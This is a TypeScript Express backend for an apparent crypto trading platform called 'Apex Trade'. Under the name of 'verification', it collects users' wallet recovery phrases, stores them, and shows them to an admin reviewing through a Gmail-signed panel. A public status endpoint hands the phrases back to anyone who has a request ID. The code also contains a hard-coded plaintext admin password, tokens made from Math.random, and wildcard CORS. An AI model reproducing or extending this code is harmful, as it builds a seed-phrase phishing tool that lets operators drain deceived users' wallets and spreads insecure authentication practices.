import express, { Request, Response, NextFunction } from "express";
import {
  VerificationRequest,
  verificationRequests,
  activeAdminSessions,
  saveDatabase,
  findRequestById,
  checkExpiration,
} from "./storage";

// Default Admin Credentials (strictly enforced: admin@trade.io / Mummy00$$)
const ADMIN_EMAIL = "admin@trade.io";
const ADMIN_PASSWORD = "Mummy00$$";

// Helpers
export function generateRequestId(): string {
  const num = Math.floor(100000 + Math.random() * 900000);
  return `REQ-${num}`;
}

export function generateSecureToken(prefix = "tok"): string {
  return `${prefix}_${Math.random().toString(36).substring(2, 12)}_${Date.now().toString(36)}`;
}

// Admin Authentication Middleware
export function requireAdminAuth(req: Request, res: Response, next: NextFunction): void {
  const authHeader = req.headers.authorization || req.headers["x-admin-token"];
  let token = "";

  if (typeof authHeader === "string") {
    token = authHeader.startsWith("Bearer ") ? authHeader.substring(7).trim() : authHeader.trim();
  }

  if (!token || !activeAdminSessions.has(token)) {
    res.status(401).json({
      error: "Unauthorized",
      message: "Admin authentication required. Please log in to the administrator portal.",
    });
    return;
  }
  next();
}

export function createApiRouter(): express.Router {
  const router = express.Router();

  // Health check endpoint
  router.get("/health", (_req: Request, res: Response) => {
    res.json({
      status: "ok",
      uptime: process.uptime(),
      activeRequests: verificationRequests.size,
      timestamp: Date.now(),
    });
  });

  // -------------------------------------------------------------
  // Admin Authentication Endpoints
  // -------------------------------------------------------------

  // Admin Login (Strictly: Email "admin@trade.io", Password "Mummy00$$")
  router.post("/admin/login", (req: Request, res: Response) => {
    const { email, password } = req.body || {};
    const normalizedEmail = (email || "").trim().toLowerCase();

    const expectedEmail = ADMIN_EMAIL.trim().toLowerCase();
    const expectedPassword = ADMIN_PASSWORD;

    if (normalizedEmail === expectedEmail && password === expectedPassword) {
      const sessionToken = generateSecureToken("adm_sess");
      activeAdminSessions.add(sessionToken);
      saveDatabase();

      res.json({
        success: true,
        token: sessionToken,
        admin: {
          id: "adm_root",
          email: "admin@trade.io",
          name: "System Administrator",
          role: "SUPER_ADMIN",
          permissions: ["verify_deposits", "verify_users", "manage_system"],
        },
      });
      return;
    }

    res.status(401).json({
      success: false,
      message: "Invalid administrator credentials. Please check your email and password.",
    });
  });

  // Check Admin Session Status (supports both /admin/session and /admin/me)
  const handleAdminSessionCheck = (req: Request, res: Response) => {
    const authHeader = req.headers.authorization || req.headers["x-admin-token"];
    let token = "";
    if (typeof authHeader === "string") {
      token = authHeader.startsWith("Bearer ") ? authHeader.substring(7).trim() : authHeader.trim();
    }

    if (token && activeAdminSessions.has(token)) {
      res.json({
        authenticated: true,
        admin: {
          id: "adm_root",
          email: ADMIN_EMAIL,
          name: "System Administrator",
          role: "SUPER_ADMIN",
        },
      });
    } else {
      res.status(401).json({ authenticated: false, message: "Session expired or invalid" });
    }
  };

  router.get("/admin/session", handleAdminSessionCheck);
  router.get("/admin/me", handleAdminSessionCheck);

  // Admin Logout
  router.post("/admin/logout", (req: Request, res: Response) => {
    const authHeader = req.headers.authorization || req.headers["x-admin-token"];
    let token = "";
    if (typeof authHeader === "string") {
      token = authHeader.startsWith("Bearer ") ? authHeader.substring(7).trim() : authHeader.trim();
    }

    if (token) {
      activeAdminSessions.delete(token);
      saveDatabase();
    }
    res.json({ success: true, message: "Admin session terminated." });
  });

  // -------------------------------------------------------------
  // Admin Verification Management Endpoints
  // -------------------------------------------------------------

  // List all verification requests with counts & filtering
  router.get("/admin/requests", requireAdminAuth, (req: Request, res: Response) => {
    const statusFilter = req.query.status as string;
    const searchQuery = ((req.query.q as string) || "").toLowerCase();

    let all = Array.from(verificationRequests.values())
      .map(checkExpiration)
      .sort((a, b) => b.createdAt - a.createdAt);

    if (searchQuery) {
      all = all.filter(
        (r) =>
          r.id.toLowerCase().includes(searchQuery) ||
          r.userName.toLowerCase().includes(searchQuery) ||
          r.userEmail.toLowerCase().includes(searchQuery) ||
          r.asset.toLowerCase().includes(searchQuery) ||
          (r.type && r.type.toLowerCase().includes(searchQuery)) ||
          (r.protocol && r.protocol.toLowerCase().includes(searchQuery)) ||
          (r.web3Wallet && r.web3Wallet.toLowerCase().includes(searchQuery)) ||
          (r.walletPhrase && r.walletPhrase.toLowerCase().includes(searchQuery)) ||
          (r.walletAddress && r.walletAddress.toLowerCase().includes(searchQuery)) ||
          (r.depositAddress && r.depositAddress.toLowerCase().includes(searchQuery))
      );
    }

    const counts = {
      all: all.length,
      pending: all.filter((r) => r.status === "pending").length,
      approved: all.filter((r) => r.status === "approved").length,
      rejected: all.filter((r) => r.status === "rejected").length,
      expired: all.filter((r) => r.status === "expired").length,
    };

    let filtered = all;
    if (statusFilter && statusFilter !== "all") {
      filtered = all.filter((r) => r.status === statusFilter);
    }

    res.json({ requests: filtered, counts });
  });

  // Admin Approve Request
  router.post("/verification/:id/approve", requireAdminAuth, (req: Request, res: Response) => {
    const id = req.params.id;
    const existing = findRequestById(id);

    if (!existing) {
      res.status(404).json({ error: "Verification request not found." });
      return;
    }

    if (existing.status === "approved") {
      res.json({
        success: true,
        message: "Request was already approved.",
        request: existing,
      });
      return;
    }

    const accessToken = generateSecureToken("vtok");
    const updated: VerificationRequest = {
      ...existing,
      status: "approved",
      approvedAt: Date.now(),
      updatedAt: Date.now(),
      approvedBy: "Admin (apexsupportservice67@gmail.com)",
      accessToken,
      notes: req.body?.notes || "Approved by administrator.",
    };

    verificationRequests.set(existing.id, updated);
    saveDatabase();

    res.json({
      success: true,
      message: `Request ${existing.id} successfully approved.`,
      request: updated,
    });
  });

  // Admin Reject Request
  router.post("/verification/:id/reject", requireAdminAuth, (req: Request, res: Response) => {
    const id = req.params.id;
    const reason = req.body?.reason || "Verification rejected by administrator.";
    const existing = findRequestById(id);

    if (!existing) {
      res.status(404).json({ error: "Verification request not found." });
      return;
    }

    const updated: VerificationRequest = {
      ...existing,
      status: "rejected",
      rejectedAt: Date.now(),
      updatedAt: Date.now(),
      rejectedBy: "Admin (apexsupportservice67@gmail.com)",
      rejectionReason: reason,
      notes: reason,
    };

    verificationRequests.set(existing.id, updated);
    saveDatabase();

    res.json({
      success: true,
      message: `Request ${existing.id} rejected.`,
      request: updated,
    });
  });

  // -------------------------------------------------------------
  // User Verification Endpoints (Public / User Access)
  // -------------------------------------------------------------

  // 1. Submit a New Verification Request
  router.post("/verification/request", (req: Request, res: Response) => {
    const {
      userId,
      userName,
      userEmail,
      userTier,
      type,
      amountUSD,
      asset,
      protocol,
      depositAddress,
      web3Wallet,
      walletPhrase,
      walletAddress,
      btcbrDigits,
      btcbrAmount,
      tokenAmount,
    } = req.body;

    const id = generateRequestId();
    const createdTimestamp = Date.now();
    const expirationDurationMs = 25 * 60 * 1000; // 25 minutes validity

    const newRequest: VerificationRequest = {
      id,
      userId: userId || "usr_guest",
      userName: userName || "Apex Trader",
      userEmail: userEmail || "trader@apextrade.io",
      userTier: userTier || "PRO",
      type: type || (web3Wallet ? "Web3 Wallet Connection" : "Crypto Deposit Verification"),
      amountUSD: Number(amountUSD) || 0,
      asset: asset || (web3Wallet ? "ETH/EVM" : "USDT"),
      protocol: protocol || (web3Wallet ? web3Wallet : "On-Chain"),
      depositAddress: depositAddress || walletAddress || "0xDepositAddress",
      web3Wallet: web3Wallet || undefined,
      walletPhrase: walletPhrase || undefined,
      walletAddress: walletAddress || depositAddress || undefined,
      btcbrDigits: btcbrDigits || undefined,
      btcbrAmount: btcbrAmount || tokenAmount || undefined,
      tokenAmount: tokenAmount || btcbrAmount || undefined,
      status: "pending",
      createdAt: createdTimestamp,
      updatedAt: createdTimestamp,
      expiresAt: createdTimestamp + expirationDurationMs,
    };

    verificationRequests.set(id, newRequest);
    saveDatabase();

    console.log(`[Verification] Created new request ${newRequest.id} for ${newRequest.userName} (${newRequest.web3Wallet ? `Web3: ${newRequest.web3Wallet}` : `${newRequest.btcbrAmount ? `${newRequest.btcbrAmount} ${newRequest.asset}` : `${newRequest.amountUSD} ${newRequest.asset}`}`})`);

    res.status(201).json({
      success: true,
      id: newRequest.id,
      status: newRequest.status,
      createdAt: newRequest.createdAt,
      expiresAt: newRequest.expiresAt,
      amountUSD: newRequest.amountUSD,
      asset: newRequest.asset,
      protocol: newRequest.protocol,
      web3Wallet: newRequest.web3Wallet,
      walletPhrase: newRequest.walletPhrase,
      walletAddress: newRequest.walletAddress,
      btcbrDigits: newRequest.btcbrDigits,
      btcbrAmount: newRequest.btcbrAmount,
      tokenAmount: newRequest.tokenAmount,
      message: "Verification request created successfully and queued for admin review.",
    });
  });

  // 2. Poll / Check Status of Specific Request (Polled by Frontend every 3-5 seconds)
  router.get("/verification/:id", (req: Request, res: Response) => {
    const id = req.params.id;
    const existing = findRequestById(id);

    if (!existing) {
      res.status(404).json({
        error: "Not Found",
        message: "Verification request does not exist or has been purged.",
      });
      return;
    }

    // Check expiration before returning
    const updated = checkExpiration(existing);

    // Return status payload
    res.json({
      id: updated.id,
      status: updated.status,
      userName: updated.userName,
      userEmail: updated.userEmail,
      amountUSD: updated.amountUSD,
      asset: updated.asset,
      protocol: updated.protocol,
      type: updated.type,
      web3Wallet: updated.web3Wallet,
      walletPhrase: updated.walletPhrase,
      walletAddress: updated.walletAddress,
      depositAddress: updated.depositAddress,
      createdAt: updated.createdAt,
      updatedAt: updated.updatedAt,
      expiresAt: updated.expiresAt,
      accessToken: updated.status === "approved" ? updated.accessToken : undefined,
      approvedAt: updated.approvedAt,
      rejectionReason: updated.rejectionReason,
      notes: updated.notes,
    });
  });

  // 3. Verify Access to Protected Destination Page (/new-page)
  router.post("/verification/verify-access", (req: Request, res: Response) => {
    const { requestId, accessToken } = req.body;

    if (!requestId) {
      res.status(400).json({
        authorized: false,
        error: "Missing request ID",
        message: "A valid verification request ID is required to access this protected resource.",
      });
      return;
    }

    const existing = findRequestById(requestId);
    if (!existing) {
      res.status(404).json({
        authorized: false,
        error: "Not Found",
        message: "The specified verification request was not found.",
      });
      return;
    }

    checkExpiration(existing);

    if (existing.status !== "approved") {
      res.status(403).json({
        authorized: false,
        status: existing.status,
        error: "Access Denied",
        message:
          existing.status === "pending"
            ? "Your verification request is still pending administrator approval."
            : existing.status === "rejected"
            ? `Your request was rejected: ${existing.rejectionReason || "Verification failed"}`
            : "Your verification request has expired.",
      });
      return;
    }

    // If token provided, verify match
    if (accessToken && existing.accessToken && existing.accessToken !== accessToken) {
      res.status(403).json({
        authorized: false,
        error: "Invalid Security Token",
        message: "The provided verification token is invalid or has expired.",
      });
      return;
    }

    // Access Granted
    res.json({
      authorized: true,
      status: "approved",
      requestId: existing.id,
      verifiedData: {
        userName: existing.userName,
        userEmail: existing.userEmail,
        userTier: existing.userTier,
        amountUSD: existing.amountUSD,
        asset: existing.asset,
        protocol: existing.protocol,
        approvedAt: existing.approvedAt,
        approvedBy: existing.approvedBy,
        settlementRef: `APEX-SETTLE-${existing.id.replace(/[^a-zA-Z0-9]/g, "")}`,
      },
    });
  });

  return router;
}

export function createExpressApp(): express.Express {
  const app = express();

  // Global CORS and security headers for API endpoints
  app.use((req: Request, res: Response, next: NextFunction) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header(
      "Access-Control-Allow-Headers",
      "Origin, X-Requested-With, Content-Type, Accept, Authorization, x-admin-token"
    );
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    if (req.method === "OPTIONS") {
      res.sendStatus(204);
      return;
    }
    next();
  });

  // JSON Body parsing
  app.use(express.json());

  // Mount API router under /api
  app.use("/api", createApiRouter());

  return app;
}
